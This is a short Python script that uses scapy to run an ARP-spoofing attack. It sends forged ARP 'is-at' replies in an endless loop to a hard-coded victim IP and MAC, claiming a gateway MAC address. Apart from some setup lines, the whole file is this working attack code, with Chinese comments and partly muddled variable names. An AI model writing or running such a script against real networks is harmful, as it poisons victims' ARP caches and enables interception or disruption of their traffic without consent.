import os
# from scapy import getmacip
from scapy.all import (
    ARP,
    Ether,
    sendp
)
ifconfig=os.system('ipconfig')
print (ifconfig)
# gmac=input('Please enter gateway IP:')
# liusheng=input('Please enter your IP:')
# liusrc=input('Please enter target IP:')
gmac="00-4c-02-2b-7e-a1"
liusheng="192.168.88.106"
# liusrc=b"10.2.120.91"
liusrc="10.2.122.17"
try:
    # tg=getmacbyip(liusrc)
    tg="6C-71-D9-85-89-25"
    print (tg)
except Exception as f:
    print( '[1-]{}'.format(f))
    exit()
def arpspoof():
  try:
    eth=Ether()
    arp=ARP(
        op="is-at",#ARP响应
        hwsrc=gmac,#网关mac
        psrc=liusheng,#网关IP
        hwdst=tg,#目标Mac
        pdst=liusrc#目标IP
    )
    print ((eth/arp).show())
    sendp(eth/arp,inter=2,loop=1)
  except Exception as g:
    print ('[2-]{}'.format(g))
    exit()
arpspoof()